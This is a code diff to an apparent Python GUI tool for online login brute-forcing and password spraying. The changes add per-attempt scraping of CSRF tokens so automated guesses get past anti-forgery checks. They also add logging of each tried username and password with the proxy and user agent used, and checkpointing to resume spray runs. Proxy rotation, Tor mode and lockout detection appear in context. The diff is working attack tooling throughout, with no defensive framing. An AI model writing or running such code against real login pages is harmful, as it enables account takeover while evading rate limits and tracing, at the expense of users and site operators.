@@ -1410,12 +1410,14 @@ class PasswordListGeneratorApp:
 				result[k.strip()] = v.strip()
 		return result
 
-	def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str, call_headers: dict | None = None, call_proxies: dict | None = None):
+	def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str, call_headers: dict | None = None, call_proxies: dict | None = None, call_params_extra: dict | None = None):
 		url = cfg['url']
 		method = cfg['method']
 		user_param = cfg['user_param']
 		pass_param = cfg['pass_param']
 		extra = dict(cfg.get('extra_params', {}))
+		if call_params_extra:
+			extra.update(call_params_extra)
 		data = {user_param: username, pass_param: password, **extra}
 		try:
 			if method == 'GET':
@@ -1696,8 +1698,12 @@ class PasswordListGeneratorApp:
 							if cfg.get('proxy_rotation') == 'per_request' or cfg.get('tor_mode') or not sess.proxies:
 								purl = next_proxy_url()
 								call_proxies = build_proxies_dict(purl)
+							# Per-attempt CSRF refresh
+							params_extra = None
+							if cfg.get('refresh_csrf'):
+								params_extra = self._fetch_csrf_sync(sess, cfg)
 							t0 = time.time()
-							resp = self._http_attempt(sess, cfg, user, pwd, call_headers=call_headers, call_proxies=call_proxies)
+							resp = self._http_attempt(sess, cfg, user, pwd, call_headers=call_headers, call_proxies=call_proxies, call_params_extra=params_extra)
 							lat = time.time() - t0
 							# Lockout detection
 							locked = self._is_lockout(resp, cfg)
@@ -1706,6 +1712,30 @@ class PasswordListGeneratorApp:
 							success = self._is_success(resp, cfg)
 							error = (resp is None)
 							self._record_attempt(lat, getattr(resp, 'status_code', None), success, locked, error)
+							# Attempt log
+							ua_used = None
+							try:
+								ua_used = (call_headers or {}).get('User-Agent') or sess.headers.get('User-Agent')
+							except Exception:
+								ua_used = None
+							proxy_used = None
+							try:
+								proxy_used = (call_proxies or sess.proxies or {}).get('http') or (call_proxies or sess.proxies or {}).get('https')
+							except Exception:
+								proxy_used = None
+							if self._log_fp:
+								self._log_line([
+									datetime.now().isoformat(timespec='seconds'),
+									user,
+									pwd,
+									getattr(resp, 'status_code', ''),
+									int(lat*1000),
+									int(bool(success)),
+									int(bool(locked)),
+									int(bool(error)),
+									proxy_used or '',
+									ua_used or '',
+								])
 							with progress_lock:
 								completed += 1
 								if completed % 100 == 0:
@@ -1713,6 +1743,16 @@ class PasswordListGeneratorApp:
 									self.ui_queue.put(("progress", completed, max(total_ref, completed), elapsed))
 								if completed <= 50:
 									self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
+							# Save checkpoint periodically (spray only)
+							if cfg.get('checkpoint', {}).get('enabled') and cfg.get('spray_enabled'):
+								try:
+									ul = max(1, len(cfg.get('usernames', [])))
+									pwd_idx = completed // ul
+									user_idx = completed % ul
+									if (completed % self._checkpoint_every_attempts) == 0:
+										self._save_checkpoint(cfg, pwd_idx, user_idx)
+								except Exception:
+									pass
 							if success:
 								found_msg = f"SUCCESS: {user} / {pwd}"
 								self.ui_queue.put(("log", found_msg))
@@ -1942,7 +1982,8 @@ class PasswordListGeneratorApp:
 			except Exception as exc:
 				self.ui_queue.put(("log", f"[Form] fetch error: {exc}"))
 				return None
-		resp = fetch(cfg['url'])
+		original_page_url = cfg['url']
+		resp = fetch(original_page_url)
 		if resp is None or not resp.text:
 			return cfg
 		html = resp.text
@@ -1986,6 +2027,7 @@ class PasswordListGeneratorApp:
 					if any(tok in k.lower() for tok in ['csrf','token','authenticity']):
 						cfg['_csrf_field'] = k
 						break
+				cfg['_form_page_url'] = original_page_url
 		return cfg
 
 	def _save_checkpoint(self, cfg: dict, pwd_idx: int, user_idx: int) -> None:
@@ -2077,6 +2119,48 @@ class PasswordListGeneratorApp:
 			self._append_preview(f"Saved HTML report to {path}")
 		except Exception as exc:
 			messagebox.showerror("Export failed", str(exc))
+
+	def _fetch_csrf_sync(self, sess: requests.Session, cfg: dict) -> dict:
+		# Fetch login page and extract hidden tokens; return dict of params to merge
+		page_url = cfg.get('_form_page_url') or cfg.get('url')
+		try:
+			resp = sess.get(page_url, timeout=cfg.get('timeout', 15), verify=cfg.get('verify', True))
+			html = resp.text or ''
+			from bs4 import BeautifulSoup
+			soup = BeautifulSoup(html, 'html.parser')
+			hidden = {i.get('name'): i.get('value','') for i in soup.find_all('input', {'type':'hidden'}) if i.get('name')}
+			# prefer known csrf field
+			params = {}
+			if cfg.get('_csrf_field') and cfg.get('_csrf_field') in hidden:
+				params[cfg['_csrf_field']] = hidden[cfg['_csrf_field']]
+			else:
+				for k in hidden.keys():
+					if any(tok in (k or '').lower() for tok in ['csrf','token','authenticity']):
+						params[k] = hidden[k]
+						break
+			return params
+		except Exception:
+			return {}
+
+	async def _fetch_csrf_async(self, client, cfg: dict) -> dict:
+		page_url = cfg.get('_form_page_url') or cfg.get('url')
+		try:
+			resp = await client.get(page_url, timeout=cfg.get('timeout', 15))
+			html = resp.text or ''
+			from bs4 import BeautifulSoup
+			soup = BeautifulSoup(html, 'html.parser')
+			hidden = {i.get('name'): i.get('value','') for i in soup.find_all('input', {'type':'hidden'}) if i.get('name')}
+			params = {}
+			if cfg.get('_csrf_field') and cfg.get('_csrf_field') in hidden:
+				params[cfg['_csrf_field']] = hidden[cfg['_csrf_field']]
+			else:
+				for k in hidden.keys():
+					if any(tok in (k or '').lower() for tok in ['csrf','token','authenticity']):
+						params[k] = hidden[k]
+						break
+			return params
+		except Exception:
+			return {}
 
 
 if __name__ == "__main__":
